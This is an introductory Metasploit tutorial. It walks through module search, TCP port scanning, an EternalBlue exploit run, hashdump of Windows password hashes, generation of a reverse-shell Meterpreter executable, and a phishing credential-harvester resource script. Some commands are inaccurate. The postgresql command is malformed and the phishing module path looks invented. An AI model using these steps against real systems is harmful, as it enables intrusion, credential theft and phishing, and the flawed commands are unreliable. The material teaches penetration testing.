Metaspliot Basics

Introduction

Metasploit is an open-source penetration testing framework that helps security professionals and hackers identify and exploit vulnerabilities in computer systems. It provides a comprehensive set of tools for penetration testing, ethical hacking, and security research. Metasploit is widely used in the cybersecurity community for testing and securing systems.

Key features of Metasploit include

(1) Exploitation: Metasploit allows users to exploit vulnerabilities in target systems. It provides a vast collection of pre-built exploits for a wide range of software and operating systems.
(2) Payloads: Metasploit supports various payloads, which are pieces of code that can be executed on a target system after a successful exploit. Payloads can be used for tasks such as remote command execution, shell creation, or data extraction.
(3) Post-Exploitation Modules: Once a system is compromised, Metasploit offers post-exploitation modules for tasks like privilege escalation, lateral movement, and data exfiltration.
(4) Auxiliary Modules: These modules perform various tasks that support the penetration testing process, such as scanning, fingerprinting, and information gathering.
(5) Meterpreter: A powerful, dynamic payload that provides a wide range of post-exploitation capabilities, including file system manipulation, keylogging, and network exploration.
(6) MSFConsole: The command-line interface for interacting with Metasploit. It allows users to configure and launch exploits, payloads, and modules.
(7) MSFweb and Armitage: Web-based and graphical user interfaces for Metasploit, respectively, providing an easier way to interact with the framework.

Metasploit has multiple interfaces including;
(1) msfconsole - an interactive command-line like interface
(2) msfcli - a literal Linux command line interface
(3) Armitage - a GUI-based third party application
(4) msfweb - browser based interface

Step 1: Setting Up Metasploit

Ensure you have Kali Linux installed, as Metasploit comes preloaded. Before we start Metasploit, it’s good idea to start the postgresql database. Open the terminal and run sudo service enable postgresql to automatically start up, everytime we fire up our hacking machine. This enables Metasploit to store data in the familiar relational database model. This enables easy and seamless access to your data. Metasploit will work without postgresql, but this database enables Metasploit to run faster searches and store the information we collect while scanning and exploiting.

launch Metasploit by typing 'msfconsole.' Below is a screenshot of the Metasploit console.

	
cyber30@kali$ msfconsole

Step 2: Understanding Modules

Metasploit operates using modules, each designed for specific tasks. For example, use the 'search' command to discover available modules, and 'use' to select the one suitable for your objectives.


msf >search 
msf >search type:auxiliary tcp
msf >search type:auxiliary eternalblue
msf >search type:exploit platform:windows eternalblue

Step 3: Target Selection and Scanning

Identify your target system and perform a thorough reconnaissance using Metasploit's scanning modules, such as 'nmap.' Below is a sample command for network scanning. 


msf > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set RHOSTS 192.168.1.1
msf auxiliary(tcp) > run

Step 4: Exploitation

Exploit vulnerabilities using Metasploit's exploit modules. Set payloads and execute exploits against your target. Here's an example using the EternalBlue exploit.


msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.2
msf exploit(ms17_010_eternalblue) > run

Step 5: Post-Exploitation

Explore the post-exploitation phase using Metasploit's post modules. Gain insights into maintaining access, privilege escalation, and extracting valuable information. For instance, use the 'hashdump' module to retrieve password hashes.


msf exploit(ms17_010_eternalblue) > use post/windows/gather/hashdump
msf post(hashdump) > run

Step 6: Creating Custom Payloads

Enhance your skills by creating custom payloads tailored to specific scenarios. Understand how to encode payloads to evade detection. Below is an example of creating a simple Windows Meterpreter payload.


msf > use payload/windows/meterpreter/reverse_tcp
msf payload(reverse_tcp) > set LHOST 10.0.9.5
msf payload(reverse_tcp) > set LPORT 4444
msf payload(reverse_tcp) > generate -f exe -o custom_payload.exe

step 7: Integrating Custom Scripts into Metasploit

Customize Metasploit by integrating your scripts. For example, create a Metasploit resource script to automate the process of setting up a phishing campaign.

						
cyber30@kali$ nano phishing.rc
Insert the following: 

use auxiliary/server/phishing_credential_harvester
set SRVPORT 80
set URIPATH /
run
Launch Metasploit with the resource script: 

cyber30@kali$ msfconsole -r phishing.rc

We can get deeper into the Meterpreter, an advanced, dynamic payload in Metasploit. Interact with the compromised system, execute commands, and explore its functionalities for comprehensive post-exploitation.
